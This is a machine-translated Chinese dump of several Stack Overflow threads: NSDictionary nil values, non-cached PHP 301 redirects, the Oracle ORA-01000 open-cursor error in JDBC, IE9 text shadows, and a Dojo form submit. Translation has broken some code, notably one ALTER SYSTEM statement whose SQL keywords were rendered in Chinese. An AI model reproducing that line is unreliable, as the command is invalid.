如果密钥不存在，我还发现许多显示的帖子`objectForKey`将返回。`nil`我的问题是类中还有一个方法`NSDictionary`是“setNilValueForKey”。这怎么可能我们不能`NSDictionary`用 nil 对象指定键，而且我们有方法为 中的对象设置 nil 值`NSDictionary`。

请先提出建议，并在第二次查询时让我清楚。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:19:32.530

1）您的 jsonArray 包含除 之外的其他类型的对象`NSDictionaries`，包括至少一个`NSString`。`NSString`不响应 objectForKey: 所以当你尝试调用它时它会抛出一个异常。您必须查看 JSON 以确定如何继续您正在做的任何事情。

2）有一种`NSObject`方法`setNilValueForKey:`与键值编码有关。这与`NSDictionary`. 如果您确实需要在字典中表示 nil，请将其设置`[NSNull null]`为表示 nil 的键的对象。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:16:39.843

item 不是 NSDictionary 它是一个字符串。所以检查你的 jsonArray 它可能只包含字符串而不是字典

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:29:15.830

并非数组中的所有对象都是字典。在处理之前，您需要检查正在处理的数据类型。像这样的东西：

```
for(NSObject* item in jsonArray) {
  if ([item isKindOfClass:[NSDictionary class]]) {
    // do dictionary stuff
  }
  else if ([item isKindOfClass:[NSString class]]) {
    // do string stuff
  }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:18:49.217

**回答第二个问题**

有一个名为 NSNull 的非 nil 对象专门用于在“普通” nil 不可接受的情况下表示 nil。如果你用**[NSNull null]**对象替换你的 nils，**NSDictionary 将使用它们**。不过，您需要在退出时检查 NSNull。

[在这里](https://stackoverflow.com/questions/10856753/how-to-allow-nsmutabledictionary-to-accept-nil-value-as-a-key-object)参考更多

**回答第一个查询**

```
for(id *item in jsonArray)
{
  if([item isKindofClass:[NSDictionary class])
  {
    NSArray *allKeys = [item allKeys];
    for(NSString *strKey in allKeys)
    {
     if([strKey isEqualToString:@"EventDate"])
     {
       // EventDate key has object
       NSLog([item objectForKey:@"EventDate"]);
     }
    }
  }
} 
```

# php - 如何进行非缓存的 301 重定向？

> ID：12192590
> 
> 赞同：11
> 
> 时间：2012-08-30T08:12:55.073
> 
> 标签：php, http, redirect, http-status-code-301

前段时间所有浏览器都改变了他们的行为并开始缓存 301 重定向，我想知道如何做一个没有缓存在 php 中的 301 重定向？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-08-30T08:18:05.133

**301**是*永久*重定向，因此缓存是有意义的。如果您的重定向不是永久性的，请使用**307**（临时重定向）、**302**（找到）或**303**（参见其他）。

[**有关适当的用例，请参见此处**](http://gif.phpnet.org/frederic/programs/http_status_codes/http_status_code_definitions.htm)。

详细说明这三者之间的区别：

*   **307**是移动资源时的通用临时重定向。例如，像这样的 URL`domain.com/news/latest`可能会执行 307 重定向到最新的新闻文章，`domain.com/news/article-594873`. 由于这种临时重定向*可能会*持续一段时间（该特定文章可能是最新的几个小时），浏览器*可能会*缓存重定向。要控制它们执行的程度，请使用缓存控制标头。
*   **303**是永远*不能*缓存的重定向。例如，将一篇新文章发布到`domain.com/news`可能会创建一篇新的新闻文章，并提供到它的 303 重定向到`domain.com/news/article-978523`. 由于*另一个*POST 请求会导致创建完全不同的新文章，因此无法缓存它。
*   **302**有点陌生，我自己没用过。显然，对于不理解 303 的早期 HTTP 1.0 版本的客户端来说，它更像是 303 的传统替代品。

既然您专门询问了 PHP：

```
<?php
function header_redirect_permanent($url)
    {
    header($_SERVER['SERVER_PROTOCOL'] . ' 301 Moved Permanently', true, 301);
    header('Location: ' . $url);
    }

function header_no_cache()
    {
    header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
    header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); // past date to encourage expiring immediately
    } 
```

如果必须，您也可以使用上述缓存控制标头来阻止代理缓存 301，如下所示：

```
header_no_cache();
header_redirect_permanent($url); 
```

或简单地添加

```
header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
header('Location:'.$url, true, 301);
exit; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-09-25T11:10:39.487

没有缓存的 http 状态代码 301 可用于进行 URL 规范化，同时保留跟踪功能。

为了防止 301 重定向被缓存，只需设置缓存控制标头，然后您可以撤消重定向，客户端（机器人和浏览器）将不再被重定向。

```
header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
header('Location:'.$url, true, 301);
exit; 
```

当您希望浏览器更新书签中的 URL 和机器人更新其索引但仍能够跟踪它们或通过重定向回原始 URL 来撤消重定向而不会导致无限循环或其他废话时，这很有用。

这绝不意味着 301 代码必须用于所有重定向，相反，Core Xii 总结的不同类型的重定向具有不同的[状态](https://stackoverflow.com/a/12192663/175071)代码[。](http://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

# java - java.sql.SQLException: - ORA-01000: 超过最大打开游标

> ID：12192592
> 
> 赞同：123
> 
> 时间：2012-08-30T08:13:15.357
> 
> 标签：java, oracle, jdbc

我收到 ORA-01000 SQL 异常。所以我有一些与之相关的疑问。

1.  最大打开游标是否与 JDBC 连接数完全相关，或者它们是否也与我们为单个连接创建的语句和结果集对象相关？（我们正在使用连接池）
2.  有没有办法配置数据库中语句/结果集对象的数量（如连接）？
3.  在单线程环境中使用实例变量语句/结果集对象而不是方法本地语句/结果集对象是否可取？
4.  在循环中执行准备好的语句是否会导致此问题？（当然，我可以使用 sqlBatch） 注意：一旦循环结束，pStmt 就会关闭。

    ```
    { //method try starts  
      String sql = "INSERT into TblName (col1, col2) VALUES(?, ?)";
      pStmt = obj.getConnection().prepareStatement(sql);
      pStmt.setLong(1, subscriberID);
      for (String language : additionalLangs) {
        pStmt.setInt(2, Integer.parseInt(language));
        pStmt.execute();
      }
    } //method/try ends

    { //finally starts
       pStmt.close()
    } //finally ends 
    ```

5.  如果在单个连接对象上多次调用 conn.createStatement() 和 conn.prepareStatement(sql) 会发生什么？

**Edit1:** 6\. 使用弱/软引用语句对象是否有助于防止泄漏？

**Edit2：** 1.有什么办法，我可以在我的项目中找到所有缺少的“statement.close()”吗？我知道这不是内存泄漏。但是我需要找到一个符合垃圾收集条件的语句引用（不执行 close() 的地方）？有什么可用的工具吗？还是我必须手动分析它？

请帮助我理解它。

## 解决方案

## 在 Oracle DB 中为用户名 -VELU 查找打开的游标

转到 ORACLE 机器并以 sysdba 身份启动 sqlplus。

```
[oracle@db01 ~]$ sqlplus / as sysdba 
```

然后运行

```
SELECT   A.VALUE,
    S.USERNAME,
    S.SID,
    S.SERIAL#
  FROM V$SESSTAT A,
    V$STATNAME B,
    V$SESSION S
  WHERE A.STATISTIC# = B.STATISTIC#
    AND S.SID        = A.SID
    AND B.NAME       = 'opened cursors current'
    AND USERNAME     = 'VELU'; 
```

如果可能的话，请阅读[我的答案以更多地了解我的解决方案](https://stackoverflow.com/a/14397716/146325)

* * *

## 回答 #1

> 赞同：308
> 
> 时间：2012-09-03T11:07:32.197

ORA-01000，maximum-open-cursors 错误，是 Oracle 数据库开发中极为常见的错误。在 Java 的上下文中，当应用程序尝试打开的 ResultSet 多于数据库实例上配置的游标时，就会发生这种情况。

常见原因有：

1.  配置错误

    *   您的应用程序中查询数据库的线程比数据库上的游标多。一种情况是您的连接和线程池大于数据库上的游标数。
    *   您有许多开发人员或应用程序连接到同一个数据库实例（可能包括许多模式），并且您一起使用了太多的连接。
    *   **解决方案：**

        *   [增加](https://stackoverflow.com/a/2583309/1395668)数据库上的游标数量（如果资源允许）或
        *   减少应用程序中的线程数。
2.  光标泄漏

    *   应用程序没有关闭 ResultSets（在 JDBC 中）或游标（在数据库上的存储过程中）
    *   **解决方案**：光标泄漏是错误；增加数据库上的游标数量只会延迟不可避免的故障。可以使用[静态代码分析](http://findbugs.sourceforge.net/)、[JDBC](http://code.google.com/p/log4jdbc/)或应用程序级日志记录和[数据库监控](http://www.oracle.com/technetwork/developer-tools/sql-developer/overview/index.html)来发现泄漏。

## 背景

本节介绍游标背后的一些理论以及应如何使用 JDBC。如果你不需要知道背景，你可以跳过这一步，直接进入“消除泄漏”。

### 什么是游标？

游标是数据库上保存查询状态的资源，特别是读取器在 ResultSet 中的位置。每个 SELECT 语句都有一个游标，PL/SQL 存储过程可以根据需要打开和使用任意数量的游标。[您可以在Orafaq](http://www.orafaq.com/wiki/Cursor)上找到有关游标的更多信息。

一个数据库实例通常服务于几个不同的*模式*，许多不同的*用户*每个都有*多个会话*。为此，它为所有模式、用户和会话提供了固定数量的游标。当所有游标都打开（正在使用）并且请求进入需要新游标时，请求将失败并出现 ORA-010000 错误。

### 查找和设置游标的数量

该编号通常由 DBA 在安装时配置。当前使用的游标数量、最大数量和配置可以在[Oracle SQL Developer](http://www.oracle.com/technetwork/developer-tools/sql-developer/overview/index.html)的管理员功能中访问。从 SQL 可以设置：

```
ALTER SYSTEM SET OPEN_CURSORS=1337 SID='*' SCOPE=BOTH; 
```

### 将 JVM 中的 JDBC 与 DB 上的游标相关联

下面的 JDBC 对象与以下数据库概念紧密耦合：

*   JDBC*连接*是数据库*会话*的客户端表示并提供数据库*事务*。一个连接在任何时候只能打开一个事务（但事务可以嵌套）
*   JDBC *ResultSet*由数据库上的单个*游标支持。*当在 ResultSet 上调用 close() 时，将释放光标。
*   JDBC *CallableStatement*调用数据库上的*存储过程*，通常用 PL/SQL 编写。存储过程可以创建零个或多个游标，并且可以将游标作为 JDBC ResultSet 返回。

JDBC 是线程安全的：在线程之间传递各种 JDBC 对象是完全可以的。

例如，您可以在一个线程中创建连接；另一个线程可以使用此连接来创建 PreparedStatement，而第三个线程可以处理结果集。一个主要的限制是您在任何时候都不能在一个 PreparedStatement 上打开多个 ResultSet。请参阅[Oracle DB 是否支持每个连接的多个（并行）操作？](https://stackoverflow.com/questions/5947316/does-oracle-db-support-multiple-parallel-operations-per-connection)

请注意，数据库提交发生在连接上，因此该连接上的所有 DML（插入、更新和删除）将一起提交。因此，如果要同时支持多个事务，则每个并发 Transaction 必须至少有一个 Connection。

### 关闭 JDBC 对象

执行 ResultSet 的典型示例是：

```
Statement stmt = conn.createStatement();
try {
    ResultSet rs = stmt.executeQuery( "SELECT FULL_NAME FROM EMP" );
    try {
        while ( rs.next() ) {
            System.out.println( "Name: " + rs.getString("FULL_NAME") );
        }
    } finally {
        try { rs.close(); } catch (Exception ignore) { }
    }
} finally {
    try { stmt.close(); } catch (Exception ignore) { }
} 
```

请注意 finally 子句如何忽略 close() 引发的任何异常：

*   如果您只是在没有 try {} catch {} 的情况下关闭 ResultSet，它可能会失败并阻止 Statement 被关闭
*   我们希望允许在尝试的主体中引发的任何异常传播给调用者。如果您有一个循环，例如创建和执行语句，请记住关闭循环中的每个语句。

在 Java 7 中，Oracle 引入了[AutoCloseable 接口](http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html)，它用一些不错的语法糖替换了大部分 Java 6 样板。

### 持有 JDBC 对象

JDBC 对象可以安全地保存在局部变量、对象实例和类成员中。通常更好的做法是：

*   使用对象实例或类成员来保存在较长时间内多次重复使用的 JDBC 对象，例如 Connections 和 PreparedStatements
*   为 ResultSet 使用局部变量，因为这些变量通常是在单个函数的范围内获得、循环然后关闭的。

但是，有一个例外：如果您使用 EJB 或 Servlet/JSP 容器，则必须遵循严格的线程模型：

*   只有应用服务器创建线程（处理传入请求的线程）
*   只有应用程序服务器创建连接（您从连接池中获取）
*   在调用之间保存值（状态）时，您必须非常小心。永远不要将值存储在您自己的缓存或静态成员中——这在集群和其他奇怪的情况下是不安全的，并且应用程序服务器可能会对您的数据做可怕的事情。而是使用有状态 bean 或数据库。
*   特别是，*永远不要*在不同的远程调用上保存 JDBC 对象（Connections、ResultSets、PreparedStatements 等）——让应用程序服务器来管理它。Application Server 不仅提供了一个连接池，它还缓存了您的 PreparedStatements。

## 消除泄漏

有许多流程和工具可用于帮助检测和消除 JDBC 泄漏：

1.  在开发过程中 - 尽早发现错误是迄今为止最好的方法：

    1.  开发实践：良好的开发实践应该在软件离开开发人员办公桌之前减少软件中的错误数量。具体做法包括：

        1.  [结对编程](http://en.wikipedia.org/wiki/Pair_programming)，教育没有足够经验的人
        2.  [代码审查](http://en.wikipedia.org/wiki/Code_review)，因为多只眼睛胜过一只眼睛
        3.  [单元测试](http://en.wikipedia.org/wiki/Unit_testing)，这意味着您可以从测试工具中运行任何和所有代码库，这使得重现泄漏变得微不足道
        4.  使用[现有库](https://stackoverflow.com/questions/520585/connection-pooling-options-with-jdbc-dbcp-vs-c3p0)进行连接池，而不是构建自己的库
    2.  静态代码分析：使用像优秀的[Findbugs](http://findbugs.sourceforge.net/)这样的工具来执行静态代码分析。这会发现许多未正确处理 close() 的地方。Findbugs 有一个 Eclipse 插件，但它也可以一次性独立运行，集成到 Jenkins CI 和其他构建工具中

2.  在运行时：

    1.  可持有性和提交

        1.  如果 ResultSet 可保持性为 ResultSet.CLOSE_CURSORS_OVER_COMMIT，则在调用 Connection.commit() 方法时将关闭 ResultSet。这可以使用 Connection.setHoldability() 或使用重载的 Connection.createStatement() 方法来设置。
    2.  在运行时记录。

        1.  在您的代码中放置好的日志语句。这些内容应该清晰易懂，以便客户、支持人员和队友无需培训即可理解。它们应该简洁，包括打印关键变量和属性的状态/内部值，以便您可以跟踪处理逻辑。良好的日志记录是调试应用程序的基础，尤其是那些已部署的应用程序。
        2.  您可以将调试 JDBC 驱动程序添加到您的项目中（用于调试 - 不要实际部署它）。一个例子（我没有用过）是[log4jdbc](http://code.google.com/p/log4jdbc/)。然后你需要对这个文件做一些简单的分析，看看哪些执行没有相应的关闭。如果存在潜在问题，则应突出计算打开和关闭

            3.  监控数据库。[使用 SQL Developer 的“监控 SQL”功能或Quest 的 TOAD](http://www.quest.com/toad/)等工具监控正在运行的应用程序。[本文](http://www.orafaq.com/node/758)介绍了监控。在监视期间，您查询打开的游标（例如从表 v$sesstat）并查看它们的 SQL。如果游标的数量在增加，并且（最重要的是）被一个相同的 SQL 语句支配，那么您就知道该 SQL 存在泄漏。搜索您的代码并查看。

## 其他想法

### 你可以使用 Wea​​kReferences 来处理关闭连接吗？

弱引用和软引用是允许您以允许 JVM 在其认为合适的任何时间对所指对象进行垃圾收集的方式引用对象的方式（假设该对象没有强引用链）。

如果将构造函数中的 ReferenceQueue 传递给软引用或弱引用，则当对象发生时（如果它完全发生），当对象被 GC'ed 时，该对象被放置在 ReferenceQueue 中。使用这种方法，您可以与对象的最终确定进行交互，并且您可以在那一刻关闭或最终确定对象。

幻影引用有点奇怪。它们的目的只是控制最终确定，但您永远无法获得对原始对象的引用，因此很难在其上调用 close() 方法。

但是，尝试控制 GC 何时运行并不是一个好主意（Weak、Soft 和 PhantomReferences会在对象已排队等待 GC*之后让您知道）。*事实上，如果 JVM 中的内存量很大（例如 -Xmx2000m），您可能*永远不会*GC 对象，并且您仍然会遇到 ORA-01000。如果 JVM 内存相对于您的程序要求来说很小，您可能会发现 ResultSet 和 PreparedStatement 对象在创建后立即被 GC（在您可以读取它们之前），这可能会使您的程序失败。

**TL;DR：**弱引用机制不是管理和关闭 Statement 和 ResultSet 对象的好方法。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2013-01-18T11:12:19.147

我增加了一些更多的理解。

1.  光标只是关于一个语句对象；它既不是 resultSet 也不是连接对象。

2.  但是我们仍然必须关闭结果集以释放一些 oracle 内存。如果您不关闭不计入 CURSORS 的结果集。

3.  关闭语句对象也会自动关闭结果集对象。

4.  将为所有 SELECT/INSERT/UPDATE/DELETE 语句创建光标。

5.  每个 ORACLE DB 实例都可以使用 oracle SID 进行标识；类似地，ORACLE DB 可以使用连接 SID 来识别每个连接。两个 SID 不同。

6.  所以 ORACLE 会话只不过是一个 jdbc(tcp) 连接；这不过是一个 SID。

7.  如果我们将最大游标设置为 500，那么它仅适用于一个 JDBC 会话/连接/SID。
8.  所以我们可以有许多 JDBC 连接，它们各自没有游标（语句）。
9.  一旦 JVM 终止，所有连接/游标都将关闭，或者 JDBCConnection 已关闭，与该连接相关的 CURSORS 将被关闭。

**以 sysdba 身份登录。**

在 Putty（Oracle 登录）中：

```
 [oracle@db01 ~]$ sqlplus / as sysdba 
```

在 SqlPlus 中：

用户名： `sys as sysdba`

## 将 session_cached_cursors 值设置为 0，这样它就不会关闭游标。

```
 alter session set session_cached_cursors=0
 select * from V$PARAMETER where name='session_cached_cursors' 
```

## 选择数据库中每个连接的现有 OPEN_CURSORS 值集

```
 SELECT max(a.value) as highest_open_cur, p.value as max_open_cur FROM v$sesstat a, v$statname b, v$parameter p WHERE a.statistic# = b.statistic# AND b.name = 'opened cursors current' AND p.name= 'open_cursors'  GROUP BY p.value; 
```

## 下面是查找带有打开游标值的 SID/连接列表的查询。

```
 SELECT a.value, s.username, s.sid, s.serial#
 FROM v$sesstat a, v$statname b, v$session s
 WHERE a.statistic# = b.statistic#  AND s.sid=a.sid 
 AND b.name = 'opened cursors current' AND username = 'SCHEMA_NAME_IN_CAPS' 
```

## 使用以下查询来识别打开游标中的 sql

```
 SELECT oc.sql_text, s.sid 
 FROM v$open_cursor oc, v$session s
 WHERE OC.sid = S.sid
 AND s.sid=1604
 AND OC.USER_NAME ='SCHEMA_NAME_IN_CAPS' 
```

现在调试代码并享受吧！！！:)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-06T05:36:00.393

像这样更正您的代码：

```
try
{ //method try starts  
  String sql = "INSERT into TblName (col1, col2) VALUES(?, ?)";
  pStmt = obj.getConnection().prepareStatement(sql);
  pStmt.setLong(1, subscriberID);
  for (String language : additionalLangs) {
    pStmt.setInt(2, Integer.parseInt(language));
    pStmt.execute();
  }
} //method/try ends
finally
{ //finally starts
   pStmt.close()
} 
```

**您确定您真的要关闭您的 pStatements、连接和结果吗？**

要分析打开的对象，您可以实现委托模式，该模式将代码包装在您的语句、连接和结果对象周围。所以你会看到，如果一个对象会成功关闭。

一个例子：pStmt = obj。**getConnection** ().prepareStatement(sql);

```
 class obj{ 

    public Connection getConnection(){
    return new ConnectionDelegator(...here create your connection object and put it into ...);

    } 
}

class ConnectionDelegator implements Connection{
    Connection delegates;

    public ConnectionDelegator(Connection con){
       this.delegates = con;
    }

    public Statement prepareStatement(String sql){
        return delegates.prepareStatement(sql);
    }

    public void close(){
        try{
           delegates.close();
        }finally{
           log.debug(delegates.toString() + " was closed");
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-08-23T14:44:04.120

如果您的应用程序是在作为应用程序服务器的 Oracle WebLogic 上运行的 Java EE 应用程序，则此问题的可能原因是 WebLogic 中的[Statement Cache Size](http://docs.oracle.com/cd/E21764_01/web.1111/e13737/ds_tuning.htm#i1193250)设置。

如果特定数据源的 Statement Cache Size 设置大约等于或大于 Oracle 数据库最大打开游标计数设置，则所有打开游标都可以被 WebLogic 保持打开状态的缓存 SQL 语句使用，从而导致在 ORA-01000 错误中。

要解决此问题，请将指向 Oracle 数据库的每个 WebLogic 数据源的 Statement Cache Size 设置减小到明显小于数据库上的最大游标计数设置。

在 WebLogic 10 管理控制台中，可以在服务（左侧导航）> 数据源 >（单个数据源）> 连接池选项卡中找到每个数据源的语句缓存大小设置。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-09-27T17:28:49.717

我也遇到过这个问题。以下异常曾经来过

```
java.sql.SQLException: - ORA-01000: maximum open cursors exceeded 
```

我将**Spring Framework**与**Spring JDBC**用于 dao 层。

我的应用程序曾经以某种方式泄漏游标，几分钟左右后，它曾经给我这个异常。

经过大量彻底的调试和分析，我发现我正在执行的**查询**中使用的其中一个**表中的****索引、主键和唯一约束存在问题。**

 ****我的应用程序试图更新错误**索引的****Columns**。因此，每当我的应用程序对索引列进行更新查询时，数据库都会尝试根据更新的值进行重新索引。它正在泄漏**游标**。

 ****我能够通过对用于在查询中搜索的列进行正确索引并在需要时应用适当的约束来解决问题。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-01-18T21:52:01.003

我今天遇到了同样的问题（ORA-01000）。我在 try{} 中有一个 for 循环，在 Oracle DB 中多次执行 SELECT 语句（每次更改一个参数），在 finally{} 中我让我的代码像往常一样关闭Resultset、PreparedStatement 和 Connection . 但是，当我达到特定数量的循环（1000）时，我得到了关于太多打开游标的 Oracle 错误。

根据上面 Andrew Alcock 的帖子，我进行了更改，以便**在循环内部**，在获取数据后和再次循环之前关闭每个结果集和每个语句，从而解决了问题。

此外，在另一个 Oracle DB (ORA-01000) 的另一个插入语句循环中发生了完全相同的问题，这次是在 300 条语句之后。再次以相同的方式解决它，因此 PreparedStatement 或 ResultSet 或两者都计为打开的游标，直到它们关闭。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-03T10:22:45.070

您是否设置了 autocommit=true？如果不试试这个：

```
{ //method try starts  
    String sql = "INSERT into TblName (col1, col2) VALUES(?, ?)";
    Connection conn = obj.getConnection()
    pStmt = conn.prepareStatement(sql);

    for (String language : additionalLangs) {
        pStmt.setLong(1, subscriberID);
        pStmt.setInt(2, Integer.parseInt(language));
        pStmt.execute();
        conn.commit();
    }
} //method/try ends { 
    //finally starts
    pStmt.close()
} //finally ends 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-01-21T21:21:51.150

查询以查找打开的 sql。

```
SELECT s.machine, oc.user_name, oc.sql_text, count(1) 
FROM v$open_cursor oc, v$session s
WHERE oc.sid = s.sid
and S.USERNAME='XXXX'
GROUP BY user_name, sql_text, machine
HAVING COUNT(1) > 2
ORDER BY count(1) DESC 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-09-14T16:25:20.717

此问题主要发生在您使用连接池时，因为当您关闭连接时，该连接会返回到连接池，并且与该连接关联的所有游标都不会关闭，因为与数据库的连接仍处于打开状态。因此，一种替代方法是减少池中连接的空闲连接时间，因此每当连接在连接中闲置 10 秒时，与数据库的连接将关闭并创建新连接以放入池中。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-09-17T07:15:22.693

使用批处理将导致更少的开销。有关示例，请参见以下链接： [http ://www.tutorialspoint.com/jdbc/jdbc-batch-processing.htm](http://www.tutorialspoint.com/jdbc/jdbc-batch-processing.htm)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-06-27T21:37:59.673

在我们的例子中，我们使用的是 Hibernate，并且我们有许多变量引用同一个 Hibernate 映射实体。我们在循环中创建和保存这些引用。每个引用打开一个游标并保持打开状态。

我们通过在运行代码时使用[查询来检查打开游标的数量、](http://www.techpaste.com/2012/06/13/steps-solve-ora-01000-maximum-open-cursors-exceeded-issue-weblogic/?doing_wp_cron=1403729247.7885780334472656250000)使用调试器单步执行并有选择地注释掉内容来发现这一点。

至于为什么每个新引用打开另一个游标 - 有问题的实体具有映射到它的其他实体的集合，我认为这与它有关（也许不仅仅是这个，而是结合我们如何配置获取模式和缓存设置）。Hibernate 本身存在[无法关闭](https://hibernate.atlassian.net/browse/HHH-8811)打开游标的错误，尽管看起来这些错误已在以后的版本中得到修复。

由于我们实际上并不需要对同一个实体有如此多的重复引用，因此解决方案是停止创建并保留所有这些冗余引用。一旦我们这样做了，当我们离开的时候问题就来了。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2016-10-19T23:07:57.470

我在 WildFly 和 Tomcat 中的数据源连接到 Oracle 10g 时遇到了这个问题。

我发现在某些情况下，即使调用了 statement.close()，该语句也没有关闭。问题出在我们使用的 Oracle 驱动程序：ojdbc7.jar。该驱动程序适用于 Oracle 12c 和 11g，在与 Oracle 10g 一起使用时似乎存在一些问题，所以我降级到 ojdbc5.jar，现在一切正常。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-10-31T07:40:57.973

我遇到了同样的问题，因为我正在查询 db 超过 1000 次迭代。我在我的代码中使用了 try 和 finally。但仍然出现错误。

为了解决这个问题，我刚刚登录到 oracle db 并运行以下查询：

ALTER SYSTEM SET open_cursors = 8000 范围=两者；

这立即解决了我的问题。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2021-10-18T09:01:10.017

在将准备好的语句缓存大小设置为一个较大的值后，我遇到了这个问题。显然，当准备好的语句保存在缓存中时，游标保持打开状态。********

# css - IE9中的文本阴影过滤器

> ID：12192593
> 
> 赞同：0
> 
> 时间：2012-08-30T08:13:22.153
> 
> 标签：css, internet-explorer-9

IE 9 不支持文本阴影。

所以我使用这个过滤器。它应用文本阴影，但也应用带有阴影的黑色虚线。

```
filter: progid:DXImageTransform.Microsoft.Shadow(direction=135, color=#FFFFFF, Strength=3); 
```

我怎样才能去除这个黑点？

您可以[在线](http://pacmangroup.com/test/)访问它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T06:55:23.137

有[过滤](http://msdn.microsoft.com/en-us/library/ms532995%28v=vs.85%29.aspx)器[，`Glow`](http://msdn.microsoft.com/en-us/library/ms532995%28v=vs.85%29.aspx)*有点*类似于`text-shadow`. 也许值得尝试一下：

```
filter: progid:DXImageTransform.Microsoft.Glow(color=#ffffff, strength=3); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:22:55.143

使用 JQuery 也可以在 IE 中创建阴影：[Text-shadow in IE with jQuery](http://kilianvalkhof.com/2008/javascript/text-shadow-in-ie-with-jquery/)（在我看来，这是比过滤器更好的解决方案。）

# javascript - 为什么这个 dijit.form 不提交？

> ID：12192599
> 
> 赞同：0
> 
> 时间：2012-08-30T08:13:48.173
> 
> 标签：javascript, forms, dojo

为什么这个表格不会提交？

```
<div data-dojo-type="dijit/form/Form" id="myForm" data-dojo-id="myForm"
encType="multipart/form-data" action="Cart.php" method="post">
<input type="text" name="searchName" 
data-dojo-type="dijit/form/TextBox"
data-dojo-props="trim:true, propercase:true" id="searchName" />
<input type="radio" data-dojo-type="dijit/form/RadioButton" name="sl" id="radioOne"    value="full"/> <label for="radioOne">Full</label>
<input type="radio" data-dojo-type="dijit/form/RadioButton" name="sl" id="radioTwo" value="short"/> <label for="radioTwo">Short</label>
Data Select
<select name="select1" data-dojo-type="dijit/form/Select">
<option  value="2">Data1</option>
<option  value="1">Data2</option>
</select>
<button data-dojo-type="dijit/form/Button" type="submit" name="submitButton"     value="Submit">Submit</button>
</div> 
```

也有一些 javascript：

```
 <script src="//ajax.googleapis.com/ajax/libs/dojo/1.8/dojo/dojo.js" data-dojo-config="parseOnLoad:true"></script>
    <script type="text/javascript">
dojo.require("dijit.form.Form");
dojo.require("dijit.form.Button");
dojo.require("dijit.form.TextBox");
dojo.require("dijit/layout/AccordionContainer"); 
dojo.require("dijit/layout/BorderContainer");
dojo.require("dijit/layout/ContentPane");
    </script> 
```

也许这是一个愚蠢的问题，但我已经看了几个小时，仍然无法弄清楚。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:23:28.090

我不确定你遇到什么*不会提交*。我将您的代码移到 JS Bin ( [http://jsbin.com/iziwen/1/edit](http://jsbin.com/iziwen/1/edit) ) 中，它工作正常：

![在此处输入图像描述](../Images/6ce31aa8ca6bb1fc996f80f6726bf954.png)

如果您在服务器端遇到问题，我建议您更改`encType="multipart/form-data"`为`enctype="application/x-www-form-urlencoded"`（或根本不使用它，因为它是默认值）-您不需要`multipart/form-data`，您没有发送文件（请参阅[此处](https://stackoverflow.com/questions/4526273/what-does-enctype-multipart-form-data-mean)的更多信息）。

如果这没有帮助，请指定*不会*更准确地提交。

**编辑：**我不使用`dijit/form/Form`提交功能，我只是获取表单数据并通过 XHR 将它们发送到我的 Web 服务，但我查看了提交功能的工作原理，看起来你需要`<iframe>`使用提交功能。所以这就是我改变的：

A. 表单定义——`target:"formSubmitIframe"`指向 iframe id：

```
<form
    id="myForm"
    data-dojo-id="myForm"
    data-dojo-type="dijit/form/Form"  
    data-dojo-props="action:'Cart.php', method:'post', target:'formSubmitIframe'"
> 
```

B. 添加 iframe：

```
<iframe name="formSubmitIframe" src="about:blank"></iframe> 
```

一旦所有工作都为您添加`style="display:none;"`到 iframe 以隐藏它。

在 JS Bin 中查看它的实际效果：http: [//jsbin.com/iziwen/7/edit](http://jsbin.com/iziwen/7/edit)

**注意：**我不建议以这种方式提交表单。如果您不需要跨域或发送文件，只需通过 获取表单数据`var data = dijit.byId("myForm").get("value")`，因此您将获得 JSON 格式的表单数据，然后通过`dojo/xhr`or发送它们`dojo/request`（对于 dojo 1.8+）。

也`dojo/xhr`可以通过提供表单 ID 来发送表单 - 这是一个很好的例子： http: [//livedocs.dojotoolkit.org/dojo/xhr](http://livedocs.dojotoolkit.org/dojo/xhr)

# ios - 我想在我的第一个视图中保存带有日期和日期的假期列表。我们如何做到这一点？

> ID：12192603
> 
> 赞同：0
> 
> 时间：2012-08-30T08:14:08.260
> 
> 标签：ios, ios4, iphone-sdk-3.0

我想在我的第一个视图中保存假期列表。我有另一个视图（即第二视图），在该视图的文本字段中选择日期、日期和输入节日名称。当我单击后退按钮导航栏时，我想在我的第一个视图中显示所选数据。我们该怎么做？

如何在我的第一个视图中显示选定的数据？我想把它存储在手机内存中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:35:48.000

在 NSUserDefault 中存储值节日名称和选定日期

现在将出现在第一个视图中的视图，当按下后退按钮时将调用该视图

如果 NSUserDefault 有节日名称和选定的日期，则显示它们

# azure - Azure dll版本调试难度

> ID：12192606
> 
> 赞同：2
> 
> 时间：2012-08-30T08:14:16.903
> 
> 标签：azure

